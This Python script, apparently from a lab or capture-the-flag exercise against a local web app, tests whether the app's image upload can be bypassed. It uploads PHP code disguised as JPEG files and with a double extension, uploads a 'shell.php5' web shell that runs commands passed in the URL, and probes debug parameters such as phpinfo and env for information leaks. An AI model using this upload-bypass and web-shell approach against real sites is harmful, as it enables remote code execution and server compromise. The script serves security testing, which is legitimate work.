import requests

base_url = "http://127.0.0.1:32824"
print("Testing file upload validation and error messages")
print("=" * 60)

# Let's try to understand the upload functionality better
# First, let's see what happens with different file types

# Create test files with different content

test_cases = [
    ("valid.jpg", b"\xff\xd8\xff\xe0\x00\x10JFIF", "image/jpeg"),  # Valid JPEG header
    ("fake.php", b"<?php echo 'test'; ?>", "application/x-php"),
    ("fake.jpg", b"<?php echo 'test'; ?>", "image/jpeg"),  # PHP code with JPG extension
    ("double.php.jpg", b"<?php echo 'test'; ?>", "image/jpeg"),  # Double extension
    ("shell.php5", b"<?php system($_GET['cmd']); ?>", "application/x-php"),
]

for filename, content, mime_type in test_cases:
    print(f"\n--- Testing upload: {filename} ---")
    
    files = {'userfile': (filename, content, mime_type)}
    data = {'submit': 'Upload Image'}
    
    try:
        response = requests.post(f"{base_url}/index.php", files=files, data=data, timeout=10)
        print(f"Status: {response.status_code}")
        
        # Check response content for error messages, success messages, or clues
        response_text = response.text.lower()
        if "invalid" in response_text:
            print("❌ UPLOAD REJECTED: Invalid file detected")
            # Look for what validation failed
            if "extension" in response_text:
                print("   → Extension validation active")
            if "structure" in response_text or "header" in response_text:
                print("   → File structure/headers validation active")
        elif "success" in response_text or "uploaded" in response_text:
            print("✅ UPLOAD ACCEPTED: File uploaded successfully")
            # Check if file path is revealed
            if "upload" in response_text or "/upload" in response_text:
                print("   → Upload path disclosed")
                # Print the relevant part of response
                snippet_lines = response.text.split('\n')
                for i, line in enumerate(snippet_lines):
                    if 'upload' in line.lower() or '/upload' in line:
                        print(f"   → {line.strip()}")
        elif "environment" in response_text or "env" in response_text:
            print("🔍 ENVIRONMENT VARIABLES FOUND!")
        
        # Print full response
        print(f"\nFull Response:\n{response.text}")
        
    except Exception as e:
        print(f"Error: {e}")

# Check if there are any special parameters or headers
print("\n" + "=" * 60)
print("Checking for debug parameters and special endpoints...")

# Try some common debug parameters
debug_params = ['debug', 'info', 'env', 'show_errors', 'dump', 'phpinfo']
for param in debug_params:
    try:
        url = f"{base_url}/index.php?{param}=1"
        response = requests.get(url, timeout=10)
        if len(response.text) > 1000 or 'PHP Version' in response.text or '$_SERVER' in response.text:
            print(f"🔍 POTENTIAL INFO LEAK at: {url}")
            print(f"   Length: {len(response.text)}")
            print(f"\nSnippet:\n{response.text[:500]}")
    except Exception as e:
        print(f"Error checking {param}: {e}")
    
print("\n" + "=" * 60)
print("Reconnaissance complete. Check proofs above for actual discoveries.")

